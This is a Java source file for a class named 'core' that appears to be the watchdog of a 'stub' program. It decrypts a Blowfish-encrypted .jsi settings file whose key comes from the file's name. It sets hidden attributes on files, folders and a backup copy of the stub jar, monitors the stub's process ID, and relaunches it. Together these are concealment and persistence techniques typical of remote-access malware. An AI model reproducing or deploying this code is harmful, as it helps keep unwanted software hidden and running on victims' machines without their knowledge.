import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import javax.xml.bind.DatatypeConverter;
import java.awt.*;
import java.io.*;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.net.URLDecoder;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.DosFileAttributes;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Locale;
import java.util.Timer;
import java.util.Vector;

/**
 * Created by Kevin on 4/6/2017.
 */
public class core {
    public static Timer looptmr = new Timer();
    public static String appID = "12345678asdfghjk";
    public static String stubInfo = "";
    public static String stubFile = "";
    public static String stubLoc = "";
    public static String stubName = "";
    public static boolean backup = false;
    public static Integer loopTime = 5000;
    public static String stubStatus = "Unknown";
    public static String stubPID = "";
    public static String myAppPath = "Unknown";
    public static String myAppName = "Unknown";
    public static String osType_GINFO = "Unknown";
    public static String osFullname_GINFO = "Unknown";
    //File/Folder Funcs
    public static void hideFile(File file) throws InterruptedException, IOException {
        checkOS();
        if (osType_GINFO == "Windows") {
            Path p = file.toPath();

            //link file to DosFileAttributes
            DosFileAttributes dos = Files.readAttributes(p, DosFileAttributes.class);

            //hide the Log file
            Files.setAttribute(p, "dos:hidden", true);
            dos.isHidden();
            // Process p = Runtime.getRuntime().exec("attrib +H " + file.getPath());
            //p.waitFor();
            debug.addLine("HideFILEwin: Hiding " + file.getName() + "\n", Color.lightGray, 12, false );
        }else{
            ProcessBuilder a = new ProcessBuilder();
            a.command("chflags", "hidden", file.getPath());
            try {
                a.start();
                debug.addLine("HideFILEmac: Hiding " + file.getName() + "\n", Color.lightGray, 12, false );
            } catch (IOException e) {
                debug.addLine("HideFILEmac: ERROR" + e.toString() + "\n", Color.red, 12, false );
            }
        }

    }
    public static void hideFolder(String str){
        checkOS();
        Path path = FileSystems.getDefault().getPath(str, "sa");
        if (osType_GINFO == "Windows") {
            Runtime rt = Runtime.getRuntime();
            //put your directory path instead of your_directory_path

            try {
                Process p = rt.exec("attrib +H " + str);
                try {
                    p.waitFor();
                } catch (InterruptedException e) {
                }
            } catch (IOException e) {
                debug.addLine("HIDE FOLDER: ERROR |" + e.toString() + "\n", Color.RED, 12, false);
            }

        }else{
            ProcessBuilder a = new ProcessBuilder();
            a.command("chflags", "hidden", str);
            try {
                a.start();
            } catch (IOException e) {
            }
        }
    }
    public static void copyFileUsingStream(File source, File dest) throws IOException {
        if (source.exists()){
        InputStream is = null;
        OutputStream os = null;
        try {
            is = new FileInputStream(source);
            os = new FileOutputStream(dest);
            byte[] buffer = new byte[1024];
            int length;
            while ((length = is.read(buffer)) > 0) {
                os.write(buffer, 0, length);
            }
        } finally {
            debug.addLine("COPYFILE CLOSING! " + "\n", Color.YELLOW, 12, false);

            is.close();
            os.close();
        }
        }
    }
    public static File[] grabFilesInFolders(String path){
        try{
            File folder = new File(path);
            File[] listOfFiles = folder.listFiles();

            for (int i = 0; i < listOfFiles.length; i++) {
                if (listOfFiles[i].isFile()) {
                    debug.addLine("File " + listOfFiles[i].getName() + "\n", Color.ORANGE, 10, false);
                } else if (listOfFiles[i].isDirectory()) {
                    debug.addLine("Folder " + listOfFiles[i].getName() + "\n", Color.pink, 10, true);
                }
            }
            return listOfFiles;
        }catch(Exception e){
            debug.addLine("ERROR: Couldn't grab Directory of '" + path + "' info: " + e.toString() + "\n", Color.RED, 12, true);
        }
        return null;
    }

    //Core
    public static String isStubInfoFile(){

       File[] listOfFiles = grabFilesInFolders(myAppPath);
        if (listOfFiles  == null){
            return "null";
        }
        for (int i = 0; i < listOfFiles.length; i++) {
            if (listOfFiles[i].isFile()) {
                if (listOfFiles[i].getName().endsWith(".jsi")){
                    return listOfFiles[i].getName();
                }
            }
        }
        return "null";
    }
    public static String getChildInfo(String info, String parent){
        String[] lines = info.split("\\|");
        //Filter through Settings
        for (String line: lines) {
            if (line.startsWith(parent + "=")){
                String[] result = line.split("=");
                return result[1];
            }

        }
        return "null";
    }
    public static void findSetAPPID(String str){
        String jsiNamePart = str.substring(0, str.lastIndexOf('.'));
        String s1a = jsiNamePart.substring(0, (jsiNamePart.length()/2));
        String s1b = jsiNamePart.substring((jsiNamePart.length()/2));
        File oldFile = new File(str);
        File newFile = new File("data.jsi");
        oldFile.renameTo(newFile);
        stubFile = "data.jsi";
        appID = s1b + s1a;
    }
    public static Boolean setStubInfo(String fileName){
        File file = new File(fileName);
        if (file.exists()){
            try {
                hideFile(file);
            } catch (InterruptedException e) {
                debug.addLine(e.toString() + "\n", Color.RED, 12, false);
            } catch (IOException e) {
                debug.addLine(e.toString() + "\n", Color.RED, 12, false);
            }
            try {
                byte[] array = Files.readAllBytes(file.toPath());
                try {
                    stubInfo = decryptString(array, appID);
                    debug.addLine("INFO:" + stubInfo + "\n", Color.cyan, 12, false);
                    return true;
                } catch (NoSuchPaddingException e) {
                    debug.addLine(e.toString() + "\n", Color.RED, 12, false);
                   return false;
                } catch (NoSuchAlgorithmException e) {
                    debug.addLine(e.toString() + "\n", Color.RED, 12, false);
                    return false;
                } catch (InvalidKeyException e) {
                    debug.addLine(e.toString() + "\n", Color.RED, 12, false);
                    return false;
                } catch (BadPaddingException e) {
                    debug.addLine(e.toString() + "\n", Color.RED, 12, false);
                    return false;
                } catch (IllegalBlockSizeException e) {
                    debug.addLine(e.toString() + "\n", Color.RED, 12, false);
                    return false;
                }
            } catch (IOException e) {
                debug.addLine(e.toString() + "\n", Color.RED, 12, false);
                return false;
            }
        }else{
            debug.addLine("not found." + "\n", Color.RED, 12, false);
            return false;
        }
    }
    public static Boolean doRequiredStubWork(String info) throws Exception {
        String[] lines = info.split("\\|");
        debug.addLine(lines.length + "\n", Color.cyan, 12, false);
            //Filter through Settings
            for (String line: lines) {
                debug.addLine(line + "\n", Color.cyan, 12, false);
                //BACKUP
                if (line.startsWith("BACKUP=")){
                    if(line.contains("true")){
                        backup = true;
                        if (!createBackup(info)){
                        }
                    }
                }
                //LoopTime
                if (line.startsWith("TIME=")) {
                    if (!setLoopTime(Integer.parseInt(getChildInfo(info, "TIME")))) {
                    }
                }
                //Get PID;
                if (line.startsWith("PID=")) {
                    stubPID = getChildInfo(info, "PID");
                    debug.addLine(stubPID + "\n", Color.cyan, 12, false);
                }
            }
        return true;
    }
    public static Boolean createBackup(String info) throws Exception {
        getStubPaths(info);
        File stubFile = new File(stubLoc + File.separator + stubName + ".jar");
        debug.addLine("FILENAME:" + stubLoc + File.separator + stubName + ".jar" + "\n", Color.ORANGE, 12, false);
        File backupFile = new File(myAppPath + File.separator + "backup.vbc");
        if (stubFile.exists()){
            if (backupFile.exists()){
                backupFile.delete();
            }
        }
        try {
            copyFileUsingStream(stubFile, backupFile);
        } catch (IOException e) {
            debug.addLine("COPYFILE: ERROR: " + e.toString() + "\n", Color.red, 12, false);
            return false;
        }
            try {
                try {
                    hideFile(backupFile);
                } catch (InterruptedException e) {
                    debug.addLine("hideFILE: ERROR: " + e.toString() + "\n", Color.red, 12, false);
                   return false;
                }
            } catch (IOException e) {
                debug.addLine("hideFILE: ERROR: " + e.toString() + "\n", Color.red, 12, false);
                return false;
            }
            return true;
    }
    public static void hideAllFilesINFolder(String path){
        File[] files = grabFilesInFolders(path);
        for(File file: files){
            try {
                hideFile(file);
            } catch (InterruptedException e) {
                debug.addLine("hideFILE: ERROR: " + e.toString() + "\n", Color.red, 12, false);
                e.printStackTrace();
            } catch (IOException e) {
                debug.addLine("hideFILE: ERROR: " + e.toString() + "\n", Color.red, 12, false);
                e.printStackTrace();
            }
        }
    }
    public static void getStubPaths(String info){
        if (core.osType_GINFO == "Windows"){
            stubLoc = getChildInfo(info, "LOCWIN");
            if (!stubLoc.startsWith("~")){
                stubLoc = System.getProperty("user.home") + stubLoc;
            }
            stubName = getChildInfo(info, "NAMEWIN");
        }else if (core.osType_GINFO == "MacOS"){
            stubLoc = getChildInfo(info, "LOCMAC");
            if (!stubLoc.startsWith("~")){
                try {
                    stubLoc = getMacHome() + stubLoc;
                } catch (Exception e) {

                }
            }
            stubName = getChildInfo(info, "NAMEMAC");
        }else if (core.osType_GINFO == "Linux"){
            stubLoc = getChildInfo(info, "LOCLIN");
            if (!stubLoc.startsWith("~")){
                stubLoc = System.getProperty("user.home") + stubLoc;
            }
            stubName = getChildInfo(info, "NAMELIN");
        }
    }
    public static void relaunchStub(File file) {
        ProcessBuilder pb = new ProcessBuilder("java", "-classpath", file.getPath(), "com.Volara.Main");
       // ProcessBuilder pb = new ProcessBuilder("java", "-jar", file.getPath()); Works but opens as a child
        try {
            Process p = pb.start();
        } catch (IOException e) {
            debug.addLine("LAUNCHSTUB: ERROR" + e.toString() + "\n", Color.red, 12, false );
        }
    }

    //Loop Funcs
    public static Boolean setLoopTime(Integer time){
        try{
            loopTime = time;
        }catch(Exception e){
            debug.addLine(e.toString() + "\n", Color.RED, 12, false);
            return false;
        }
        return true;
    }
    public static Boolean restartLoop(){
        try{
            looptmr.cancel();
            looptmr.schedule(new loop(), 0, loopTime);
        }catch(Exception e){
            debug.addLine(e.toString() + "\n", Color.RED, 12, false);
            return false;
        }
        return true;
    }
    public static Boolean stopLoop(){
        try{
            looptmr.cancel();
        }catch(Exception e){
            return false;
        }
        return true;
    }
    public static Boolean startLoop(){
        try{
            looptmr.schedule(new loop(), 0, loopTime);
        }catch(Exception e){
            return false;
        }
        return true;
    }
    public static String getMacHome() throws Exception {
        String home = System.getProperty("user.home");

        if (isRoot()) {
            home = "";
        }

        return home;
    }
    //Encoding & Decoding
    //Base64
    public static String base64Encode(String str){
        String encoded = DatatypeConverter.printBase64Binary(str.getBytes());
        return encoded;
    }
    public static String base64Decode(String str){
        String decoded = new String(DatatypeConverter.parseBase64Binary(str));
        return decoded;
    }
    //BlowFish
    public static byte[] cryptString(String s, String cryptKey) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, UnsupportedEncodingException, BadPaddingException, IllegalBlockSizeException {
        byte[] KeyData = cryptKey.getBytes();
        SecretKeySpec KS = new SecretKeySpec(KeyData, "Blowfish");
        Cipher cipher = Cipher.getInstance("Blowfish");
        cipher.init(Cipher.ENCRYPT_MODE, KS);
        byte[] ci = cipher.doFinal(s.getBytes("UTF-8"));
        return ci;
    }
    public static String decryptString(byte[] s, String cryptKey) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, BadPaddingException, IllegalBlockSizeException {
        byte[] KeyData = cryptKey.getBytes();
        SecretKeySpec KS = new SecretKeySpec(KeyData, "Blowfish");
        Cipher cipher = Cipher.getInstance("Blowfish");
        cipher.init(Cipher.DECRYPT_MODE, KS);
        String ret = new String(cipher.doFinal(s));
        return ret;
    }

    //Procss Funcs
    public static String getPid() throws IOException,InterruptedException {
        checkOS();
        if (osType_GINFO == "Windows"){
            RuntimeMXBean runtimeBean = ManagementFactory.getRuntimeMXBean();

            String jvmName = runtimeBean.getName();
            System.out.println("JVM Name = " + jvmName);
            long pid = Long.valueOf(jvmName.split("@")[0]);
            System.out.println("JVM PID  = " + pid);
            return Long.toString(pid);
        }else{
            Vector<String> commands=new Vector<String>();
            commands.add("/bin/bash");
            commands.add("-c");
            commands.add("echo $PPID");
            ProcessBuilder pb=new ProcessBuilder(commands);

            Process pr=pb.start();
            pr.waitFor();
            if (pr.exitValue()==0) {
                BufferedReader outReader=new BufferedReader(new InputStreamReader(pr.getInputStream()));
                return outReader.readLine().trim();
            } else {
                System.out.println("Error while getting PID");
                return "";
            }
        }
    }
    public static boolean isStillAllive(String pidStr) {
        String OS = System.getProperty("os.name").toLowerCase();
        String command = null;
        if (OS.indexOf("win") >= 0) {
            debug.addLine("Check alive Windows mode. Pid: [{}]" +  pidStr + "\n", Color.lightGray, 12, false);
            command = "cmd /c tasklist /FI \"PID eq " + pidStr + "\"";
        } else if (OS.indexOf("nix") >= 0 || OS.indexOf("nux") >= 0) {
            debug.addLine("Check alive Linux mode. Pid: [{}]" +  pidStr + "\n", Color.lightGray, 12, false);
            command = "ps -p " + pidStr;
        } else {
            debug.addLine("Check alive Windows mode. Pid: [{}]" +  pidStr + "\n", Color.lightGray, 12, false);
            return false;
        }
        return isProcessIdRunning(pidStr, command); // call generic implementation
    }
    public static boolean isProcessIdRunning(String pid, String command) {
        debug.addLine("Command [{}]" + command + "\n" , Color.lightGray, 12, false);
        try {
            Runtime rt = Runtime.getRuntime();
            Process pr = rt.exec(command);

            InputStreamReader isReader = new InputStreamReader(pr.getInputStream());
            BufferedReader bReader = new BufferedReader(isReader);
            String strLine = null;
            while ((strLine= bReader.readLine()) != null) {
                if (strLine.contains(" " + pid + " ")) {
                    return true;
                }
            }

            return false;
        } catch (Exception ex) {
            debug.addLine("Got exception using system command [{}]." + ex.toString() + "\n" , Color.RED, 12, false);
            return true;
        }
    }

    //Sys Funcs
    public static String checkOS(){
        String OS = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
        osFullname_GINFO = OS;
        if ((OS.indexOf("mac") >= 0) || (OS.indexOf("darwin") >= 0)) {
            osType_GINFO = "MacOS";
            return "MacOS";
        } else if (OS.indexOf("win") >= 0) {
            osType_GINFO = "Windows";
            return "Windows";
        } else if (OS.indexOf("nux") >= 0) {
            osType_GINFO = "Linux";
            return "Linux";
        } else {
            osType_GINFO = "Other";
            return "Other";
        }
    }
    public static boolean isRoot() throws Exception {
        return checkOS() != "Windows" && new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("whoami").getInputStream())).readLine().equals("root");
    }
    public static String returnAppName(){
        try {
            myAppName = new URLDecoder().decode(new File(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getName(), "UTF-8");
            return myAppName;
        } catch (UnsupportedEncodingException e) {
            return "Unknown";
        }
    }
    public static String returnAppPath(){
        try {
            myAppPath = new URLDecoder().decode(new File("").getAbsolutePath(), "UTF-8");
            return myAppPath;
        } catch (UnsupportedEncodingException e) {
            return "Unknown";
        }
    }
}
